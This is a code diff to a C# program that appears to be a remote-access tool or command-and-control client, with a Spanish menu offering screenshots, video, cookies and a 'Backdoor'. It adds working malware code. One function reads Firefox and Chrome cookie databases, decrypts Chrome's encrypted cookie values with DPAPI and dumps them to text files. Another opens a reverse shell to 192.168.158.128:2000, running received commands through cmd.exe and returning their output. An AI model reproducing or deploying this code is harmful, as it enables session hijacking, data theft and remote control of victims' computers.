@@ -49,7 +49,7 @@ namespace pm3candc
             menu += "2.- Captura de pantalla\n";
             menu += "3.- Video\n";
             menu += "4.- cookies\n";
-            menu += "5.- \n";
+            menu += "5.- Backdoor\n";
             ConnectSSL(menu);
         }
         static string ReadMessage(SslStream sslStream)
@@ -203,10 +203,11 @@ namespace pm3candc
                             // Video
                         }else if(opcion == 4)
                         {
-                            // Cookies
-                        }else if(opcion == 5)
+                            cookies();
+                        }
+                        else if(opcion == 5)
                         {
-                            // 
+                            conectar("192.168.158.128", 2000);
                         }
                     }
 
@@ -430,6 +431,86 @@ namespace pm3candc
             }
         }
 
+        static void cookies()
+        {
+            string user = Environment.UserName;
+
+
+            //****************************COOKIES MOZILLA FIREFOX****************************
+
+            StreamWriter cookies_Mtxt = new StreamWriter("CookiesMozilla.txt");
+
+
+            string rutaDirMozilla = "C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles/";
+            DirectoryInfo directory = new DirectoryInfo(@rutaDirMozilla);
+            DirectoryInfo[] directories = directory.GetDirectories();
+
+            rutaDirMozilla = rutaDirMozilla + directories[0].ToString();
+            string cookiesFileMF = rutaDirMozilla + "/cookies.sqlite";
+
+            if (File.Exists(cookiesFileMF))
+            {
+
+                SQLiteConnection m_dbConnection = new SQLiteConnection("Data Source=" + cookiesFileMF);
+                m_dbConnection.Open();
+
+
+
+                string sql = "select * from moz_cookies";
+                SQLiteCommand command = new SQLiteCommand(sql, m_dbConnection);
+                SQLiteDataReader reader = command.ExecuteReader();
+
+                while (reader.Read())
+                    cookies_Mtxt.WriteLine("Host: " + reader["host"] + " BaseDomain: " + reader["baseDomain"] + " LastAccessed: " + reader["lastAccessed"] + " Name: " + reader["name"] + " Value: " + reader["value"]);
+
+                m_dbConnection.Close();
+
+            }
+
+
+            //********************************COOKIES GOOGLE CHROME **************************************
+
+
+            StreamWriter cookies_Ctxt = new StreamWriter("CookiesChrome.txt");
+
+            string rutaVarChrome = "C:/Users/" + user + "/AppData/Local/Google/Chrome/User Data/";
+            DirectoryInfo directoryC = new DirectoryInfo(@rutaVarChrome);
+            DirectoryInfo[] directoriesC = directoryC.GetDirectories();
+            string perfil = "Default";
+            foreach (DirectoryInfo directorio in directoriesC)
+            {
+                if (directorio.ToString().StartsWith("Profile"))
+                    perfil = directorio.ToString();
+            }
+            rutaVarChrome += perfil;
+            rutaVarChrome += "/cookies";
+            string sqlchrome = "select * from cookies";
+
+
+            if (File.Exists(rutaVarChrome))
+            {
+
+                SQLiteConnection m_dbConnectionG = new SQLiteConnection("Data Source=" + rutaVarChrome);
+                m_dbConnectionG.Open();
+
+
+                SQLiteCommand commandG = new SQLiteCommand(sqlchrome, m_dbConnectionG);
+                SQLiteDataReader readerG = commandG.ExecuteReader();
+                while (readerG.Read())
+                {
+                    var encryptedData = (byte[])readerG["encrypted_value"];
+                    var decodedData = System.Security.Cryptography.ProtectedData.Unprotect(encryptedData, null, System.Security.Cryptography.DataProtectionScope.CurrentUser);
+                    var plainText = Encoding.ASCII.GetString(decodedData); // Looks like ASCII
+
+                    cookies_Ctxt.WriteLine("Host: " + readerG["host_key"] + " LastAccessed: " + readerG["last_access_utc"] + " Name: " + readerG["name"] + " Value: " + plainText);
+
+                }
+
+                m_dbConnectionG.Close();
+
+            }
+        }
+
         static void pantalla()
         {
             Rectangle region = Screen.AllScreens[0].Bounds;
@@ -439,6 +520,71 @@ namespace pm3candc
             graphic.CopyFromScreen(region.Left, region.Top, 0, 0, region.Size);
             bitmap.Save("pantalla.jpg", ImageFormat.Jpeg);
         }
+
+        public static NetworkStream socket_server;
+        public static void conectar(string ip, int porta)
+        {
+            TcpClient conectando = new TcpClient();
+            conectando.Connect(ip, porta);
+            socket_server = conectando.GetStream();
+            receber();
+
+        }
+        public static void receber()
+        {
+            while (true)
+            {
+                try
+                {
+                    byte[] receber_bytes = new byte[1000];
+                    socket_server.Read(receber_bytes, 0, receber_bytes.Length);
+                    socket_server.Flush();
+                    string msg = Encoding.ASCII.GetString(receber_bytes);
+                    Console.WriteLine(msg);
+                    enviar_comando(msg);
+                }
+                catch
+                {
+                    break;
+                }
+            }
+        }
+        public static void enviar_comando(string comando)
+        {
+            try
+            {
+                Console.WriteLine("excutando");
+                Console.WriteLine(comando);
+                ProcessStartInfo startInfo = new ProcessStartInfo();
+                startInfo.FileName = "cmd.exe";
+                startInfo.Arguments = "/C " + comando;
+                startInfo.UseShellExecute = false;
+                startInfo.RedirectStandardOutput = true;
+                using (Process process = Process.Start(startInfo))
+                {
+                    using (StreamReader reader = process.StandardOutput)
+                    {
+                        string result = reader.ReadToEnd();
+                        int tamanho_cmando = result.Length;
+                        string t_comando = Convert.ToString(tamanho_cmando);
+                        byte[] rbytes = Encoding.ASCII.GetBytes(t_comando);
+                        socket_server.Write(rbytes, 0, rbytes.Length);
+                        socket_server.Flush();
+                        Console.WriteLine(tamanho_cmando);
+                        byte[] comandos = Encoding.ASCII.GetBytes(result);
+                        socket_server.Write(comandos, 0, comandos.Length);
+                        socket_server.Flush();
+
+                    }
+                }
+            }
+            catch
+            {
+
+            }
+        }
+
+
     }
    class Ventana
     {
